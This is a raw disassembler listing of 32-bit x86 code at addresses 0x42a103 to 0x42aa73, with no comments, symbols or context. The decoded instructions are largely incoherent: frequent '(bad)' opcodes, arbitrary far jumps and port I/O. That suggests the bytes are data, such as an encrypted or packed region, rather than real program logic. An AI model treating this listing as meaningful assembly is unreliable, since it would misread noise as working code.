  42a103:	sbb    DWORD PTR [ecx+eax*8+0x1040001],ecx
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	add    edx,DWORD PTR [edx]
  42a10e:	out    dx,al
  42a10f:	mov    al,0x99
  42a111:	mov    edi,0x789a48ab
  42a116:	rcl    DWORD PTR [esi],1
  42a118:	jg     0x42a15b
  42a11a:	das    
  42a11b:	aad    0x82
  42a11d:	(bad)  [ebp-0x43]
  42a120:	mov    DWORD PTR [eax],ebx
  42a122:	stc    
  42a123:	or     BYTE PTR [eax],ch
  42a125:	sbb    BYTE PTR [edi+eax*4],ch
  42a128:	rcr    DWORD PTR [ebp+0x63],1
  42a12b:	cwde   
  42a12c:	addr16 pop eax
  42a12e:	mov    ah,0xd9
  42a130:	sbb    dl,ah
  42a132:	xchg   esp,eax
  42a133:	inc    esi
  42a134:	inc    esp
  42a135:	jmp    DWORD PTR [edx]
  42a137:	push   eax
  42a138:	shl    DWORD PTR [ecx-0x45],0x87
  42a13c:	push   eax
  42a13d:	dec    ecx
  42a13e:	xor    dl,BYTE PTR [eax]
  42a140:	ins    DWORD PTR es:[edi],dx
  42a141:	into   
  42a142:	push   ecx
  42a143:	pop    esp
  42a144:	inc    ebp
  42a145:	pop    edi
  42a146:	(bad)  [ecx-0x35]
  42a149:	mov    esi,0xa49e3853
  42a14e:	ins    BYTE PTR es:[edi],dx
  42a14f:	mov    al,ds:0xc07bfdb
  42a154:	(bad)  
  42a155:	(bad)  
  42a156:	(bad)  
  42a158:	xor    esi,DWORD PTR [eax]
  42a15a:	or     eax,0x1e26183f
  42a160:	sub    BYTE PTR [esi-0xd],dh
  42a163:	add    esp,DWORD PTR [eax+0x79]
  42a166:	mul    dh
  42a168:	sbb    ch,BYTE PTR [edx-0x61b84c20]
  42a16e:	mov    DWORD PTR [edx],ebx
  42a170:	cwde   
  42a171:	cs clc 
  42a173:	ds loop 0x42a123
  42a176:	scas   eax,DWORD PTR es:[edi]
  42a177:	es dec edi
  42a179:	dec    edx
  42a17a:	enter  0x81d3,0xb
  42a17e:	cmp    ch,BYTE PTR [ebp+0x3b]
  42a181:	push   0xb39cac16
  42a186:	jbe    0x42a1f7
  42a188:	shr    DWORD PTR [esi-0x5e],cl
  42a18b:	pop    edi
  42a18c:	xor    BYTE PTR [edi-0x756c2e26],cl
  42a192:	fsubr  st,st(7)
  42a194:	call   0xcb54:0xa4cb00a
  42a19b:	mov    ebp,0xb49321b5
  42a1a0:	cli    
  42a1a1:	mov    bl,0x63
  42a1a3:	sub    DWORD PTR [ebx-0x2],edi
  42a1a6:	pop    ss
  42a1a7:	enter  0x5bcd,0x9c
  42a1ab:	inc    ecx
  42a1ac:	shl    DWORD PTR [ebx+0x36],0xeb
  42a1b0:	cmp    BYTE PTR [ebx],0x42
  42a1b3:	sub    al,0x26
  42a1b5:	pop    edi
  42a1b6:	xchg   edx,eax
  42a1b7:	adc    dh,BYTE PTR [esi+ebp*2-0x5660bd36]
  42a1be:	in     eax,0xfa
  42a1c0:	sbb    al,0xe1
  42a1c2:	lea    edx,[ecx+0x7a]
  42a1c5:	pop    ecx
  42a1c6:	fisttp WORD PTR [edx-0x6e7785a3]
  42a1cc:	bound  esp,QWORD PTR [esi]
  42a1ce:	cmp    bh,bl
  42a1d0:	(bad)  [esi+ecx*1]
  42a1d3:	cmp    bh,BYTE PTR [ebp+0x17]
  42a1d6:	enter  0x1e1,0xf0
  42a1da:	sub    eax,0x62c4015
  42a1df:	or     dl,bl
  42a1e1:	loope  0x42a209
  42a1e3:	clc    
  42a1e4:	enter  0x556,0xc
  42a1e8:	lahf   
  42a1e9:	xor    al,0x9
  42a1eb:	sub    esp,DWORD PTR [ecx+0x1660a4e6]
  42a1f1:	into   
  42a1f2:	xor    esi,DWORD PTR [esi]
  42a1f4:	imul   esp,DWORD PTR [edi+ecx*2+0x3c],0x59
  42a1f9:	inc    esi
  42a1fa:	std    
  42a1fb:	mov    cl,0x41
  42a1fd:	xchg   ecx,eax
  42a1fe:	nop
  42a1ff:	push   es
  42a200:	cli    
  42a201:	jne    0x42a1cd
  42a203:	jb     0x42a1d8
  42a205:	(bad)  
  42a206:	or     ch,dh
  42a208:	popf   
  42a209:	inc    esi
  42a20a:	xlat   BYTE PTR ds:[ebx]
  42a20b:	push   esi
  42a20c:	xor    cl,dh
  42a20e:	or     DWORD PTR [esi],ecx
	...
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	(bad)  
  42a281:	(bad)  
  42a282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a283:	stc    
  42a284:	nop
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	mov    bl,0x82
  42a28e:	pop    ds
  42a28f:	or     bl,BYTE PTR [ebx+0x1a469619]
  42a295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a296:	sbb    al,0x53
  42a298:	leave  
  42a299:	jle    0x42a295
  42a29b:	push   ebx
  42a29c:	adc    eax,0x15185854
  42a2a1:	sbb    dh,0x88
  42a2a4:	sbb    BYTE PTR [edx-0x48],0x4f
  42a2a8:	inc    di
  42a2aa:	sar    BYTE PTR [edx],cl
  42a2ac:	test   BYTE PTR [ebx+0x2f],al
  42a2af:	cmp    edx,DWORD PTR [eax]
  42a2b1:	pusha  
  42a2b2:	mov    ebx,0x8422726c
  42a2b7:	inc    edx
  42a2b8:	mov    WORD PTR [ebp+0x5ed542cf],fs
  42a2be:	js     0x42a277
  42a2c0:	mov    al,0x51
  42a2c2:	ins    DWORD PTR es:[edi],dx
  42a2c3:	or     edi,DWORD PTR [ecx+0xd]
  42a2c6:	sbb    DWORD PTR [edi-0x40],0x2c486a18
  42a2cd:	in     eax,dx
  42a2ce:	xor    bh,BYTE PTR ds:0x3d6a9f19
  42a2d4:	mov    cl,0x9a
  42a2d6:	adc    ah,BYTE PTR [edi]
  42a2d8:	into   
  42a2d9:	call   0xc11a:0xa3cf12a7
  42a2e0:	push   eax
  42a2e1:	pop    ebp
  42a2e2:	or     edx,eax
  42a2e4:	fs push 0xc
  42a2e7:	into   
  42a2e8:	es in  eax,dx
  42a2ea:	sbb    cl,ah
  42a2ec:	das    
  42a2ed:	sbb    al,0xe2
  42a2ef:	jb     0x42a34e
  42a2f1:	arpl   WORD PTR [ebp-0xb],ax
  42a2f4:	mov    ds:0xb429fb8,eax
  42a2f9:	and    al,0xd3
  42a2fb:	or     edi,0xad1ed77
  42a301:	mov    cl,0x1b
  42a303:	shr    BYTE PTR [edi+0x44f56f74],cl
  42a309:	cmp    eax,0xfa00e7a2
  42a30e:	ins    DWORD PTR es:[edi],dx
  42a30f:	push   edx
  42a310:	out    0xf2,eax
  42a312:	imul   edx,DWORD PTR [ebx-0x7d13787a],0x131f572f
  42a31c:	jmp    edi
  42a31e:	ins    DWORD PTR es:[edi],dx
  42a31f:	cli    
  42a320:	cmp    BYTE PTR [ecx],bh
  42a322:	xchg   BYTE PTR [esi-0x3a],dh
  42a325:	xchg   edi,eax
  42a326:	aad    0x9e
  42a328:	pop    esp
  42a329:	pop    ds
  42a32a:	clc    
  42a32b:	sbb    eax,0xe67c1e2f
  42a330:	icebp  
  42a331:	clc    
  42a332:	pop    esp
  42a333:	push   eax
  42a334:	mov    al,ds:0xee2c5944
  42a339:	mov    dl,0xf7
  42a33b:	(bad)  
  42a33c:	jge    0x42a33c
  42a33e:	mov    ecx,DWORD PTR [edi+esi*8-0x796149f8]
  42a345:	push   es
  42a346:	mov    ebp,0x6f160299
  42a34b:	xchg   ecx,eax
  42a34c:	scas   al,BYTE PTR es:[edi]
  42a34d:	or     BYTE PTR [edx],ch
  42a34f:	xor    DWORD PTR [ebx],esp
  42a351:	or     cl,dl
  42a353:	sahf   
  42a354:	pop    esi
  42a355:	jl     0x42a370
  42a357:	inc    esp
  42a358:	adc    eax,0xb49df8f8
  42a35d:	aaa    
  42a35e:	lods   eax,DWORD PTR ds:[esi]
  42a35f:	out    0x7b,al
  42a361:	fnstcw WORD PTR [esi]
  42a363:	cmp    dl,BYTE PTR [edi]
  42a365:	shl    DWORD PTR [edi+eiz*2+0x7238253b],cl
  42a36c:	cmp    edx,DWORD PTR [esi+0x2d]
  42a36f:	jmp    0x42a3a7
  42a371:	mov    ebp,0xb61f1ec1
  42a376:	pop    edi
  42a377:	js     0x42a31a
  42a379:	mov    edi,0x60760d01
  42a37e:	pop    esi
  42a37f:	sbb    DWORD PTR [esi-0x79],eax
  42a382:	in     eax,0xdd
  42a384:	cmc    
  42a385:	cmp    BYTE PTR ds:0xbf08302e,ch
  42a38b:	stc    
  42a38c:	pop    ecx
  42a38d:	mov    dh,0x91
  42a38f:	aas    
	...
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x3ca0073d
  42a403:	fist   WORD PTR [ebx+eax*8+0x1040001]
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	cdq    
  42a40d:	in     al,dx
  42a40e:	(bad)  
  42a40f:	not    DWORD PTR [ebx-0x6f]
  42a412:	and    BYTE PTR [eax-0x40cce3c8],ch
  42a418:	push   DWORD PTR [edx-0x763a26f0]
  42a41e:	lahf   
  42a41f:	mov    edx,0x578c249f
  42a424:	ret    
  42a425:	out    0xc2,eax
  42a427:	mov    dl,0xc2
  42a429:	(bad)  [ebx+0x3c]
  42a42c:	dec    eax
  42a42d:	aad    0x84
  42a42f:	mov    esi,0xc43ef4f8
  42a434:	and    ebp,ebx
  42a436:	iret   
  42a437:	push   eax
  42a438:	lea    ebp,ds:0x8f7204d3
  42a43e:	and    dl,BYTE PTR ds:0xd8a880c9
  42a444:	ja     0x42a487
  42a446:	sbb    eax,0x133802ed
  42a44b:	fldenv [eax+0xfaf49c0]
  42a451:	loope  0x42a48d
  42a453:	mul    ebp
  42a455:	mov    al,ds:0x84c5671f
  42a45a:	jmp    0xc492:0x376a067d
  42a461:	inc    edx
  42a462:	push   ebx
  42a463:	jne    0x42a4be
  42a465:	push   cs
  42a466:	aam    0x89
  42a468:	push   edi
  42a469:	add    al,0xc
  42a46b:	pushf  
  42a46c:	out    0x79,eax
  42a46e:	jge    0x42a482
  42a470:	sub    ecx,DWORD PTR [edi]
  42a472:	mov    edx,0x2c97ccd0
  42a477:	mov    esp,0x2195e7eb
  42a47c:	pop    ss
  42a47d:	mov    eax,ds:0x5df0d148
  42a482:	mov    ebp,0x758486fc
  42a487:	je     0x42a4f5
  42a489:	dec    edx
  42a48a:	sbb    ebx,DWORD PTR [ebx+0x1e5674a0]
  42a490:	inc    edx
  42a491:	lahf   
  42a492:	addr16 jb 0x42a41e
  42a495:	ss jecxz 0x42a4ef
  42a498:	stc    
  42a499:	pusha  
  42a49a:	jge    0x42a44a
  42a49c:	xchg   ecx,eax
  42a49d:	sti    
  42a49e:	mov    eax,ds:0x1682f1e6
  42a4a3:	loopne 0x42a4e0
  42a4a5:	hlt    
  42a4a6:	inc    ebx
  42a4a7:	out    dx,eax
  42a4a8:	adc    esi,edx
  42a4aa:	fcmovnbe st,st(5)
  42a4ac:	jne    0x42a4ec
  42a4ae:	es xchg esp,eax
  42a4b0:	and    eax,0x916b96ba
  42a4b5:	ds jae 0x42a438
  42a4b8:	add    dh,bh
  42a4ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4bb:	sbb    BYTE PTR [ecx],cl
  42a4bd:	dec    esp
  42a4be:	push   ebp
  42a4bf:	sbb    DWORD PTR [ebp+0x5e5b3f13],edx
  42a4c5:	mov    ebx,0x8567b446
  42a4ca:	mov    al,ds:0x1e49baae
  42a4cf:	dec    esi
  42a4d0:	push   esp
  42a4d1:	add    DWORD PTR [eax+0x7b],ecx
  42a4d4:	cld    
  42a4d5:	mov    ecx,0x5521fb8e
  42a4da:	or     eax,esp
  42a4dc:	in     eax,0x16
  42a4de:	jmp    0x7f12c76b
  42a4e3:	push   0x17
  42a4e5:	jg     0x42a549
  42a4e7:	mov    esp,DWORD PTR [ebx]
  42a4e9:	aas    
  42a4ea:	xchg   edx,eax
  42a4eb:	xor    dl,BYTE PTR [ebx-0x3bd91657]
  42a4f1:	fiadd  WORD PTR [esi+eiz*1+0x50]
  42a4f5:	popa   
  42a4f6:	jmp    0x60cf312b
  42a4fb:	jae    0x42a4be
  42a4fd:	out    dx,al
  42a4fe:	push   0xfffffff3
  42a500:	inc    ebp
  42a501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a502:	ins    BYTE PTR es:[edi],dx
  42a503:	out    0xa0,eax
  42a505:	xor    DWORD PTR [edi+0x68],eax
  42a508:	and    edi,DWORD PTR [edi]
  42a50a:	sub    DWORD PTR [edi],ecx
  42a50c:	dec    eax
  42a50d:	imul   DWORD PTR [edi+0x56]
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xaf87c69f
  42a583:	addr16 cwde 
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	inc    edx
  42a58d:	and    DWORD PTR [ecx+0x37],esp
  42a590:	dec    DWORD PTR [ebp+0x1852992a]
  42a596:	sub    cl,BYTE PTR [esi+0x2]
  42a599:	adc    esp,DWORD PTR [ebp-0x18]
  42a59c:	cmp    BYTE PTR [edi+0x2686317b],ah
  42a5a2:	jmp    0xead5746f
  42a5a7:	inc    ecx
  42a5a8:	mov    dh,0x6a
  42a5aa:	fwait
  42a5ab:	stos   BYTE PTR es:[edi],al
  42a5ac:	xchg   ebx,eax
  42a5ad:	nop
  42a5ae:	pinsrw mm1,WORD PTR [ecx-0x4a],0x89
  42a5b3:	out    0x2a,eax
  42a5b5:	and    DWORD PTR [ecx+0x35],ecx
  42a5b8:	iret   
  42a5b9:	fcomi  st,st(1)
  42a5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5bd:	and    DWORD PTR [esi-0xa5599d6],edi
  42a5c3:	inc    ecx
  42a5c4:	cmc    
  42a5c5:	mov    dl,BYTE PTR [ecx]
  42a5c7:	gs jae 0x42a5e1
  42a5ca:	adc    BYTE PTR [esi-0x32],cl
  42a5cd:	inc    edx
  42a5ce:	sub    eax,0x87716916
  42a5d3:	dec    edx
  42a5d4:	mov    ?,WORD PTR [eax]
  42a5d6:	enter  0x8baf,0xbf
  42a5da:	mov    dh,0xbf
  42a5dc:	dec    ebx
  42a5dd:	popa   
  42a5de:	dec    esi
  42a5df:	xchg   edx,eax
  42a5e0:	pop    es
  42a5e1:	hlt    
  42a5e2:	add    DWORD PTR [eax-0x34],0x34
  42a5e6:	retf   
  42a5e7:	jle    0x42a5f1
  42a5e9:	dec    esp
  42a5ea:	stos   BYTE PTR es:[edi],al
  42a5eb:	jo     0x42a64f
  42a5ed:	bound  ebx,QWORD PTR [edi+eax*8-0x2]
  42a5f1:	xor    al,BYTE PTR [ebp-0x2e9e5b3c]
  42a5f7:	loope  0x42a5e9
  42a5f9:	pop    eax
  42a5fa:	fnstsw ax
  42a5fc:	adc    cl,bh
  42a5fe:	sub    al,0x92
  42a600:	push   eax
  42a601:	dec    esp
  42a602:	in     eax,0x5
  42a604:	jmp    0x1648ab10
  42a609:	test   DWORD PTR [ecx-0x5f],esi
  42a60c:	retf   0x6e61
  42a60f:	mov    ebx,0xd218ea34
  42a614:	dec    edi
  42a615:	(bad)  
  42a616:	mov    ebp,DWORD PTR [ebx+0x7f]
  42a619:	push   es
  42a61a:	jge    0x42a635
  42a61c:	in     al,0xb7
  42a61e:	cmp    bh,BYTE PTR [edi+0x59b43f3]
  42a624:	bound  edx,QWORD PTR [ebx+0x44]
  42a627:	xchg   ecx,eax
  42a628:	mov    WORD PTR [ecx-0x75],?
  42a62b:	jbe    0x42a694
  42a62d:	cld    
  42a62e:	inc    edi
  42a62f:	jae    0x42a651
  42a631:	xor    cl,BYTE PTR cs:[eax]
  42a634:	mov    DWORD PTR [edi],esp
  42a636:	mov    esp,DWORD PTR [edx-0x18]
  42a639:	clc    
  42a63a:	and    BYTE PTR [ebp+0x71b5bfd9],bl
  42a640:	push   esi
  42a641:	xor    BYTE PTR [ecx+0x399aaa4b],ah
  42a647:	sbb    BYTE PTR [ebx+0x57],bh
  42a64a:	fld    DWORD PTR [ebp-0x15c23371]
  42a650:	pop    edi
  42a651:	xlat   BYTE PTR ds:[ebx]
  42a652:	dec    edx
  42a653:	or     DWORD PTR [ecx],ecx
  42a655:	ins    BYTE PTR es:[edi],dx
  42a656:	lods   eax,DWORD PTR ds:[esi]
  42a657:	mov    ds:0x9c17afb4,eax
  42a65c:	xchg   esp,eax
  42a65d:	lods   eax,DWORD PTR ds:[esi]
  42a65e:	aaa    
  42a65f:	adc    ch,BYTE PTR [eax]
  42a661:	lds    esp,FWORD PTR [ebx-0x3d24451a]
  42a667:	(bad)  
  42a668:	mov    dl,bh
  42a66a:	jge    0x42a5f9
  42a66c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a66e:	sbb    ebp,edi
  42a670:	pop    ebx
  42a671:	add    ecx,DWORD PTR [edi+0x2a]
  42a674:	and    ebx,DWORD PTR [eax+esi*1-0x5b35ff1e]
  42a67b:	into   
  42a67c:	pop    ebp
  42a67d:	push   0xffffff9c
  42a67f:	add    al,0x26
  42a681:	ror    DWORD PTR [esi+0x1a940912],1
  42a687:	(bad)  
  42a688:	je     0x42a663
  42a68a:	ss std 
  42a68c:	push   ss
  42a68d:	pop    edi
  42a68e:	cmc    
  42a68f:	in     eax,0x0
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x1247ece4],0x9c15be34
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	sub    al,bl
  42a70e:	pop    ecx
  42a70f:	pop    ds
  42a710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a711:	jl     0x42a77b
  42a713:	push   DWORD PTR [eax+edx*4]
  42a716:	dec    esi
  42a717:	xor    DWORD PTR [edx+0x31],ecx
  42a71a:	je     0x42a6bb
  42a71c:	adc    al,0x57
  42a71e:	lea    ebp,[ecx-0x47]
  42a721:	das    
  42a722:	dec    ebx
  42a723:	xor    eax,0x4198d182
  42a728:	fsub   DWORD PTR [bp+si]
  42a72b:	lea    esp,[edx-0x65]
  42a72e:	jecxz  0x42a77c
  42a730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a731:	aas    
  42a732:	cmp    eax,0x51e5db71
  42a737:	jmp    0xe6fb6a6d
  42a73c:	pop    es
  42a73d:	(bad)  
  42a73e:	in     al,dx
  42a73f:	js     0x42a713
  42a741:	adc    al,0x41
  42a743:	shl    esp,cl
  42a745:	mov    ds:0x2934394c,al
  42a74a:	(bad)  
  42a74b:	sub    edx,DWORD PTR [edi]
  42a74d:	jge    0x42a7ca
  42a74f:	mov    eax,ds:0x8d2d2c4f
  42a754:	ins    BYTE PTR es:[edi],dx
  42a755:	pop    eax
  42a756:	push   0xffffff8b
  42a758:	loopne 0x42a724
  42a75a:	fcom   DWORD PTR [edx+0xd5d1a69]
  42a760:	popf   
  42a761:	pop    ebx
  42a762:	xor    al,0x7f
  42a764:	cld    
  42a765:	rcl    BYTE PTR [ebp+0x5aec4e03],0x3e
  42a76c:	jno    0x42a712
  42a76e:	ffreep st(6)
  42a770:	outs   dx,BYTE PTR ds:[esi]
  42a771:	or     BYTE PTR [ecx],ah
  42a773:	and    ebp,DWORD PTR [edx]
  42a775:	sar    DWORD PTR [ecx-0xe],0x43
  42a779:	aam    0x1b
  42a77b:	xor    dh,al
  42a77d:	adc    edx,DWORD PTR ds:0x6acbc732
  42a783:	dec    eax
  42a784:	push   edi
  42a785:	push   eax
  42a786:	xchg   ebp,eax
  42a787:	pop    ebx
  42a788:	jb     0x42a71f
  42a78a:	fs jne 0x42a7bd
  42a78d:	jmp    0x42a722
  42a78f:	jle    0x42a745
  42a791:	arpl   si,di
  42a793:	mov    DWORD PTR [esi],edi
  42a795:	mov    bh,0x7f
  42a797:	dec    ebp
  42a798:	pop    eax
  42a799:	dec    esi
  42a79a:	xchg   edi,eax
  42a79b:	fmul   QWORD PTR [eax-0x2a]
  42a79e:	xadd   BYTE PTR [esi],ah
  42a7a1:	nop
  42a7a2:	mov    ebp,0xe6e1aee3
  42a7a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7a9:	(bad)  
  42a7aa:	in     eax,dx
  42a7ab:	and    dh,BYTE PTR [ecx]
  42a7ad:	jbe    0x42a7ca
  42a7af:	xor    al,0xe2
  42a7b1:	popf   
  42a7b2:	or     DWORD PTR [edx+0x75],eax
  42a7b5:	fsub   DWORD PTR ds:0x1f9be392
  42a7bb:	es dec edi
  42a7bd:	sub    al,0x1d
  42a7bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7c0:	nop
  42a7c1:	arpl   WORD PTR [edi+ebp*2],di
  42a7c4:	cmp    al,0x2d
  42a7c6:	and    al,0x7c
  42a7c8:	test   al,0xcd
  42a7ca:	ret    
  42a7cb:	xchg   BYTE PTR [edi],al
  42a7cd:	lods   eax,DWORD PTR ds:[esi]
  42a7ce:	not    BYTE PTR [eax+esi*2]
  42a7d1:	add    al,0x41
  42a7d3:	mov    edx,0xdbc663d4
  42a7d8:	sbb    DWORD PTR [ecx],esi
  42a7da:	ret    0x728c
  42a7dd:	xor    BYTE PTR [edi+0x16],cl
  42a7e0:	adc    DWORD PTR [edi-0x49],0x64
  42a7e4:	pop    edx
  42a7e5:	jmp    0xf25:0x1af2e5e2
  42a7ec:	lds    edi,FWORD PTR [eax-0x5d68ada]
  42a7f2:	or     al,0x69
  42a7f4:	sbb    DWORD PTR [edi+0x36],esp
  42a7f7:	pushf  
  42a7f8:	lea    ebx,[edx-0x50374bf8]
  42a7fe:	jne    0x42a81d
  42a800:	call   0xd32e:0x26ab9e2
  42a807:	test   BYTE PTR [edx+eax*8-0x1486e129],bl
  42a80e:	test   DWORD PTR [eax+0x0],eax
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x1996c97
  42a882:	adc    cl,al
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    bl,dl
  42a88d:	ins    BYTE PTR es:[edi],dx
  42a88e:	std    
  42a88f:	mov    al,ds:0xcf82ebd1
  42a894:	xchg   ecx,eax
  42a895:	mov    al,ds:0xefc927db
  42a89a:	fwait
  42a89b:	dec    edx
  42a89c:	outs   dx,DWORD PTR ds:[esi]
  42a89d:	inc    edx
  42a89e:	rcl    bh,cl
  42a8a0:	loopne 0x42a87c
  42a8a2:	jne    0x42a8e0
  42a8a4:	repz inc esp
  42a8a6:	mov    edx,0xf6e1944e
  42a8ab:	add    BYTE PTR [ebx],dl
  42a8ad:	enter  0xf9b1,0xeb
  42a8b1:	sbb    BYTE PTR [eax-0x16],dh
  42a8b4:	rcl    BYTE PTR [edi-0x4b72a918],1
  42a8ba:	jp     0x42a862
  42a8bc:	leave  
  42a8bd:	inc    ebx
  42a8be:	(bad)  
  42a8c0:	popf   
  42a8c1:	ja     0x42a848
  42a8c3:	adc    ecx,DWORD PTR [ebx-0xb]
  42a8c6:	outs   dx,DWORD PTR ds:[esi]
  42a8c7:	jns    0x42a862
  42a8c9:	mov    cl,0x5e
  42a8cb:	(bad)  
  42a8cc:	inc    DWORD PTR [edi]
  42a8ce:	es and al,0x39
  42a8d1:	call   0xb03d4124
  42a8d6:	push   0xffa7fff4
  42a8db:	loop   0x42a8ad
  42a8dd:	test   ah,cl
  42a8df:	jmp    0x31958ecd
  42a8e4:	popa   
  42a8e5:	pop    ebx
  42a8e6:	xchg   esi,eax
  42a8e7:	enter  0xa957,0x32
  42a8eb:	cmp    eax,0x9b0d5c5
  42a8f0:	lds    ebp,FWORD PTR [ebp-0x20]
  42a8f3:	jno    0x42a955
  42a8f5:	push   esp
  42a8f6:	adc    DWORD PTR [edi-0x584562fd],ecx
  42a8fc:	mov    ah,0xd2
  42a8fe:	add    BYTE PTR [ecx],0xab
  42a901:	jb     0x42a943
  42a903:	xlat   BYTE PTR ds:[ebx]
  42a904:	sub    ebp,0xb6177412
  42a90a:	test   DWORD PTR [esi+0x2d],ebx
  42a90d:	add    cl,BYTE PTR [eax]
  42a90f:	cdq    
  42a910:	xchg   DWORD PTR [ebp-0x7807bd1b],eax
  42a916:	out    0x80,eax
  42a918:	out    dx,al
  42a919:	je     0x42a8c7
  42a91b:	sar    BYTE PTR [ebx],cl
  42a91d:	jns    0x42a982
  42a91f:	xor    eax,0xf5b4bccc
  42a924:	stos   BYTE PTR es:[edi],al
  42a925:	fisubr DWORD PTR [esi]
  42a927:	rdtsc  
  42a929:	cld    
  42a92a:	mov    dl,0xa1
  42a92c:	popa   
  42a92d:	push   edi
  42a92e:	add    cl,BYTE PTR [esp+eax*4-0x1c66bd9b]
  42a935:	push   esp
  42a936:	xchg   BYTE PTR [esi+0x7829be54],bl
  42a93c:	fadd   QWORD PTR [edx-0x2f]
  42a93f:	add    eax,0x5213d2bd
  42a944:	(bad)  
  42a945:	out    0xf6,al
  42a947:	xor    DWORD PTR [esi],esi
  42a949:	add    DWORD PTR [ebx-0x6d],edx
  42a94c:	jnp    0x42a92e
  42a94e:	repnz cld 
  42a950:	stos   DWORD PTR es:[edi],eax
  42a951:	mov    dh,0x7
  42a953:	sbb    DWORD PTR [ecx+0x6573c0ac],0x6519d630
  42a95d:	xlat   BYTE PTR ds:[ebx]
  42a95e:	push   ds
  42a95f:	test   DWORD PTR [ebx+eax*4],ebp
  42a962:	clc    
  42a963:	in     al,0x0
  42a965:	aaa    
  42a966:	mov    ds:0xd4e2ac6d,eax
  42a96b:	das    
  42a96c:	lds    edx,FWORD PTR [edx]
  42a96e:	aaa    
  42a96f:	cmp    esi,ecx
  42a971:	and    esi,DWORD PTR [ecx+0x5aa173fb]
  42a977:	iret   
  42a978:	es ja  0x42a9d8
  42a97b:	repz jne 0x42a947
  42a97e:	add    eax,0xdafc1a5c
  42a983:	daa    
  42a984:	dec    ebx
  42a985:	cmc    
  42a986:	je     0x42a93c
  42a988:	gs mov ebx,edx
  42a98b:	mov    bh,0xbf
  42a98d:	lods   al,BYTE PTR ds:[esi]
  42a98e:	rcr    DWORD PTR [eax+0x0],0x0
	...
  42a9f2:	add    BYTE PTR [eax],al
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	and    al,0xcf
  42aa02:	sub    al,BYTE PTR [ebx-0x5c]
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR [edi],bl
  42aa0d:	imul   eax,DWORD PTR [edi+0x37],0xfffffff8
  42aa11:	inc    edx
  42aa12:	inc    eax
  42aa13:	loop   0x42aa8f
  42aa15:	jl     0x42a9cb
  42aa17:	sahf   
  42aa18:	out    0x3b,al
  42aa1a:	bound  eax,QWORD PTR [edx+ebx*8]
  42aa1d:	cli    
  42aa1e:	mov    esp,ebx
  42aa20:	dec    edi
  42aa21:	nop
  42aa22:	cwde   
  42aa23:	pop    ss
  42aa24:	js     0x42a9af
  42aa26:	gs mov al,0xf6
  42aa29:	pop    eax
  42aa2a:	mov    esp,0xe700f629
  42aa2f:	mov    dh,0x2
  42aa31:	inc    edi
  42aa32:	sahf   
  42aa33:	pop    edi
  42aa34:	stos   DWORD PTR es:[edi],eax
  42aa35:	rol    esi,1
  42aa37:	mov    esp,0xd2905479
  42aa3c:	or     ch,BYTE PTR [esi]
  42aa3e:	sub    eax,0xc5755fce
  42aa43:	aad    0xba
  42aa45:	inc    ecx
  42aa46:	repnz cld 
  42aa48:	push   ds
  42aa49:	inc    edi
  42aa4a:	mov    eax,0x9478c4a7
  42aa4f:	xor    ecx,edi
  42aa51:	jb     0x42aaa7
  42aa53:	jle    0x42a9d5
  42aa55:	lods   al,BYTE PTR ds:[esi]
  42aa56:	inc    ebx
  42aa57:	jo     0x42aa1a
  42aa59:	mov    dh,0x43
  42aa5b:	push   ebx
  42aa5c:	dec    edi
  42aa5d:	sub    BYTE PTR cs:[eax+edi*4],ah
  42aa61:	hlt    
  42aa62:	inc    ebx
  42aa63:	mov    ds:0x8fa88975,al
  42aa68:	leave  
  42aa69:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42aa6b:	xchg   esp,eax
  42aa6c:	mov    dh,0x10
  42aa6e:	scas   al,BYTE PTR es:[edi]
  42aa6f:	shr    ch,cl
  42aa71:	xor    dh,al
  42aa73:	mov    edx,0xf01b1df8
